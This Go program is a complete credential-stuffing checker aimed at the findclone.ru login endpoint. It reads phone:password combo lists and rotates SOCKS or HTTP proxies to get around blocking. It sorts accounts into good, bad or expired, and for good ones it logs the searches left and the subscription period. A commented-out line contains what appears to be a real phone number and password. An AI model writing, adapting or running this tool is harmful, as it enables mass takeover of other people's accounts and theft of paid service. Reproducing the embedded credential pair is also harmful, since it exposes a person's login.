package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"h12.io/socks"
)

// Setting const
const (
	URL = "https://findclone.ru/login"

	DATA = `------WebKitFormBoundaryfBBqA8ALgiXvPNHQ
Content-Disposition: form-data; name="phone"

%s
------WebKitFormBoundaryfBBqA8ALgiXvPNHQ
Content-Disposition: form-data; name="password"

%s
------WebKitFormBoundaryfBBqA8ALgiXvPNHQ--`

	HEADERS = `Accept: application/json, text/plain, */\*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 Edg/86.0.622.63
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfBBqA8ALgiXvPNHQ
Origin: https://findclone.ru
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://findclone.ru/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru,en-GB;q=0.9,en;q=0.8`

	LOG = "{phone}:{password} | Type: {type} | Searches left: {searches_left} | Period: {period}"

	BAD_STATUS     = "Wrong password"
	GOOD_STATUS    = "success"
	BLOCK_STATUS   = "block"
	EXPIRED_STATUS = "expired"

	GOOD_DEF = "\"session_key\""

	CONN_ERROR = "conn_error"
)

var headers = make(http.Header, 0)

// AccountInfo ...
type AccountInfo struct {
	FormattedPeriod string
	Period          int64  `json:"Period"`
	Quantity        int    `json:"Quantity"`
	Type            int    `json:"Type"`
	TypeName        string `json:"TypeName"`
	SessionKey      string `json:"session_key"`
	Userid          int64  `json:"userid"`
}

// AuthData ...
type AuthData struct {
	Phone     string
	Password  string
	ProxyType string
	Proxy     string
}

// Auther ...
type Auther interface {
	Login() (*AccountInfo, error)
	BuildLog(accountInfo *AccountInfo) string
	WorkWithAccount(result string, accountInfo *AccountInfo) bool
}

func init() {
	// Build headers
	headersSlice := strings.Split(HEADERS, "\n")
	for i := 0; i < len(headersSlice); i++ {
		splited := strings.Split(headersSlice[i], ": ")
		headers.Add(splited[0], splited[1])
	}
}

func main() {
	//os.Setenv("HTTP_PROXY", "http://192.168.1.190:8888")
	var filestr, proxystr, proxytype string

	scanner := bufio.NewScanner(os.Stdin)

	r := strings.NewReplacer("\"", "")

	fmt.Print("Combos: ")
	if scanner.Scan() {
		filestr = r.Replace(scanner.Text())
	}

	fmt.Print("Proxies: ")
	if scanner.Scan() {
		proxystr = scanner.Text()
	}

	fmt.Print("Proxy type: ")
	if scanner.Scan() {
		proxytype = scanner.Text()
	}

	combos, err := readLines(filestr)
	if err != nil {
		log.Fatal(err)
	}
	

	proxies, err := readLines(proxystr)
	if err != nil {
		log.Fatal(err)
	}
	
	proxiesLen := len(proxies)

	fmt.Printf("Got %d combos\n", proxiesLen)


	proxyIndex := 0

	// Iterating combos
	for _, combo := range combos {
		array := strings.Split(combo, ":")
		user, pass := array[0], array[1]
		conn := false
		for !conn {
			proxy := proxies[proxyIndex]
			authData := AuthData{
				Phone:     user,
				Password:  pass,
				Proxy:     proxy,
				ProxyType: proxytype,
			}
			result, accountInfo := authData.Login()
			conn = authData.WorkWithAccount(result, accountInfo)
			if proxyIndex == proxiesLen-1 {
				proxyIndex = 0
			} else {
				proxyIndex++
			}
		}

	}
	//fmt.Println(login("79829280119", "Aa97evgeny"))
}

// Login ...
func (a AuthData) Login() (string, *AccountInfo) {
	var data = []byte(fmt.Sprintf(DATA, a.Phone, a.Password))
	req, err := http.NewRequest("POST", URL, bytes.NewBuffer(data))
	req.Header = headers

	// Setting up the proxy
	var tr *http.Transport
	if strings.Contains(a.ProxyType, "socks") {
		dialSocksProxy := socks.Dial(a.ProxyType + "://" + a.Proxy)
		tr = &http.Transport{Dial: dialSocksProxy}
	} else if a.ProxyType == "http" {
		url, _ := url.Parse("http://" + a.Proxy)
		tr = &http.Transport{Proxy: http.ProxyURL(url)}
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   time.Second * 3,
	}
	resp, err := client.Do(req)

	if err != nil {
		return CONN_ERROR, &AccountInfo{}
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	bodyInString := string(body)
	if strings.Contains(bodyInString, GOOD_DEF) {
		var accountInfo AccountInfo
		json.Unmarshal(body, &accountInfo)
		if accountInfo.Period < 1 {
			return EXPIRED_STATUS, &AccountInfo{}
		} else {
			formatAccountInfo(&accountInfo)
			return "success", &accountInfo
		}
	} else if strings.Contains(bodyInString, BAD_STATUS) {
		return BAD_STATUS, &AccountInfo{}
	} else {
		return BLOCK_STATUS, &AccountInfo{}
	}
}

// Decide what to do with an auth result
// Return boolean that says if connection was successed
func (a AuthData) WorkWithAccount(result string, accountInfo *AccountInfo) bool {
	combo := a.Phone + ":" + a.Password
	switch result {
	case CONN_ERROR:
		fmt.Println("[CONN_ERR] -")
		return false
	case BAD_STATUS:
		fmt.Println("[BAD]", combo)
	case EXPIRED_STATUS:
		fmt.Println("[EXPIRED]", combo)
	case GOOD_STATUS:
		log := a.buildLog(accountInfo)
		fmt.Println("[GOOD]", log)
	}
	return true
}

func (a AuthData) buildLog(accountInfo *AccountInfo) string {
	return formatLog(LOG,
		"{phone}", a.Phone,
		"{password}", a.Password,
		"{type}", accountInfo.TypeName,
		"{searches_left}", strconv.Itoa(accountInfo.Quantity),
		"{period}", accountInfo.FormattedPeriod)
}

func formatAccountInfo(accountInfo *AccountInfo) {
	fullTimestamp := time.Now().Add(
		time.Second *
			time.Duration(accountInfo.Period))
	formattedPeriod := fullTimestamp.Format("02 Jan 2006")
	accountInfo.FormattedPeriod = formattedPeriod
}

func formatLog(format string, args ...string) string {
	r := strings.NewReplacer(args...)
	return r.Replace(format)
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}
